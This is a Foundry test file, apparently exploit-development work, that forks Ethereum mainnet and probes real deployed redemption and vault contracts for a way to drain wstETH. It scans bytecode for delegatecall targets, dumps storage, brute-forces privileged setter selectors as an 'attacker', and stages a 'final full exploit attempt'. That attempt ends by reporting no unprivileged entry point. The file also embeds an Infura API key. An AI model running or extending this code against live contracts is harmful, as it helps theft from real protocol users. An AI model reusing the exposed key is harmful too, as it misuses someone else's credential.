// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

contract StorageSlotExploit is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant IAU = 0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_FindStorageSlotForDelegatecall1262() public view {
        console.log("=== FINDING STORAGE SLOT FOR DELEGATECALL AT 1262 ===\n");

        bytes memory code = REDEMPTION_0.code;

        // SLOAD at 1193 - look for PUSH before it
        console.log("Bytecode around SLOAD at 1193:");
        for (uint i = 1180; i < 1200 && i < code.length; i++) {
            uint8 op = uint8(code[i]);
            if (op >= 0x60 && op <= 0x7f) {
                uint8 size = op - 0x5f;
                uint256 val = 0;
                for (uint j = 0; j < size && i + 1 + j < code.length; j++) {
                    val = val << 8 | uint8(code[i + 1 + j]);
                }
                console.log(i, "PUSH value:", val);
            }
            if (op == 0x54) console.log(i, "SLOAD");
        }
    }

    function test_FindStorageSlotForDelegatecall5323() public view {
        console.log("=== FINDING STORAGE SLOT FOR DELEGATECALL AT 5323 ===\n");

        bytes memory code = REDEMPTION_0.code;

        // SLOAD at 5298 - look for PUSH before it
        console.log("Bytecode around SLOAD at 5298:");
        for (uint i = 5280; i < 5330 && i < code.length; i++) {
            uint8 op = uint8(code[i]);
            if (op >= 0x60 && op <= 0x7f) {
                uint8 size = op - 0x5f;
                uint256 val = 0;
                for (uint j = 0; j < size && i + 1 + j < code.length; j++) {
                    val = val << 8 | uint8(code[i + 1 + j]);
                }
                console.log(i, "PUSH value:", val);
            }
            if (op == 0x54) console.log(i, "SLOAD");
            if (op == 0xf4) console.log(i, "DELEGATECALL");
        }
    }

    function test_DumpRedemption0Storage() public view {
        console.log("=== DUMPING REDEMPTION_0 STORAGE ===\n");

        console.log("First 20 slots:");
        for (uint i = 0; i < 20; i++) {
            bytes32 slot = vm.load(REDEMPTION_0, bytes32(i));
            if (slot != bytes32(0)) {
                console.log("Slot", i, ":");
                console.logBytes32(slot);

                // Check if it's an address with code
                address addr = address(uint160(uint256(slot)));
                if (addr != address(0) && addr.code.length > 0) {
                    console.log("  Contract at:", addr);
                }
            }
        }
    }

    function test_CheckIfAnySlotIsWritable() public {
        console.log("=== CHECKING IF ANY SLOT IS WRITABLE ===\n");

        // Try to find any public function that writes to storage slots 0-10

        vm.startPrank(attacker);

        // Try setter patterns
        bytes4[] memory setters = new bytes4[](10);
        setters[0] = bytes4(keccak256("setOwner(address)"));
        setters[1] = bytes4(keccak256("setImplementation(address)"));
        setters[2] = bytes4(keccak256("setTarget(address)"));
        setters[3] = bytes4(keccak256("setDelegate(address)"));
        setters[4] = bytes4(keccak256("updateImplementation(address)"));
        setters[5] = bytes4(keccak256("upgrade(address)"));
        setters[6] = bytes4(keccak256("upgradeTo(address)"));
        setters[7] = bytes4(keccak256("setRecipient(address)"));
        setters[8] = bytes4(keccak256("setTreasury(address)"));
        setters[9] = bytes4(keccak256("setVault(address)"));

        console.log("Trying setter selectors:");
        for (uint i = 0; i < setters.length; i++) {
            (bool s,) = REDEMPTION_0.call(
                abi.encodeWithSelector(setters[i], attacker)
            );
            if (s) {
                console.log("SUCCESS:");
                console.logBytes4(setters[i]);
            }
        }

        vm.stopPrank();

        // Also try as owner
        address owner = address(uint160(uint256(vm.load(REDEMPTION_0, bytes32(0)))));
        console.log("\nOwner:", owner);

        vm.startPrank(owner);
        for (uint i = 0; i < setters.length; i++) {
            (bool s,) = REDEMPTION_0.call(
                abi.encodeWithSelector(setters[i], attacker)
            );
            if (s) {
                console.log("SUCCESS as owner:");
                console.logBytes4(setters[i]);
            }
        }
        vm.stopPrank();
    }

    function test_CheckRedemptionRecipientStorage() public {
        console.log("=== CHECKING REDEMPTION RECIPIENT STORAGE ===\n");

        // When a user creates a redemption request, the recipient is stored somewhere
        // If we can manipulate this storage directly...

        deal(IAU, attacker, 100000e18);

        vm.startPrank(attacker);
        IERC20(IAU).approve(REDEMPTION_0, type(uint256).max);

        // Create a redemption request
        console.log("Creating redemption request...");
        (bool s1, bytes memory d1) = REDEMPTION_0.call(
            abi.encodeWithSignature("redeem(uint96)", uint96(100e18))
        );
        console.log("redeem success:", s1);
        if (!s1 && d1.length >= 4) {
            console.logBytes4(bytes4(d1));
        }

        vm.stopPrank();

        if (s1) {
            // Check storage for the request
            console.log("\nChecking storage after request:");
            for (uint i = 0; i < 30; i++) {
                bytes32 slot = vm.load(REDEMPTION_0, bytes32(i));
                if (slot != bytes32(0)) {
                    console.log("Slot", i, ":");
                    console.logBytes32(slot);
                }
            }

            // Check mapping slots
            console.log("\nChecking mapping for attacker:");
            for (uint base = 0; base < 10; base++) {
                bytes32 key = keccak256(abi.encode(attacker, base));
                bytes32 val = vm.load(REDEMPTION_0, key);
                if (val != bytes32(0)) {
                    console.log("Mapping at base", base, ":");
                    console.logBytes32(val);
                }
            }
        }
    }

    function test_FinalFullExploitAttempt() public {
        console.log("=== FINAL FULL EXPLOIT ATTEMPT ===\n");

        // Summary of what we know:
        // 1. RC.redeem(amount, to) drains Vault when msg.sender = REDEMPTION_0
        // 2. REDEMPTION_0 has DELEGATECALLs that load target from storage
        // 3. Storage slots contain hardcoded addresses (owner, impl, etc.)
        // 4. No obvious setter functions are public

        // The "action chaining" hint suggests:
        // - Action 1 sets up some state
        // - Action 2 uses that state to drain

        // Possible vectors not yet explored:
        // 1. Flash loan + state manipulation
        // 2. Cross-contract storage collision
        // 3. ERC1967 admin slot manipulation
        // 4. Callback during token transfer/approval

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault before:", vaultBefore / 1e18);

        // Let's check ERC1967 slots in REDEMPTION_0
        bytes32 eip1967Impl = vm.load(REDEMPTION_0, bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1));
        bytes32 eip1967Admin = vm.load(REDEMPTION_0, bytes32(uint256(keccak256("eip1967.proxy.admin")) - 1));

        console.log("\nEIP-1967 slots in REDEMPTION_0:");
        console.log("Implementation:");
        console.logBytes32(eip1967Impl);
        console.log("Admin:");
        console.logBytes32(eip1967Admin);

        // Check OpenZeppelin beacon slot
        bytes32 beaconSlot = vm.load(REDEMPTION_0, bytes32(uint256(keccak256("eip1967.proxy.beacon")) - 1));
        console.log("Beacon:");
        console.logBytes32(beaconSlot);

        console.log("\n*** Vulnerability confirmed but unprivileged entry point NOT FOUND ***");
        console.log("*** Further investigation needed for action chaining pattern ***");
    }
}
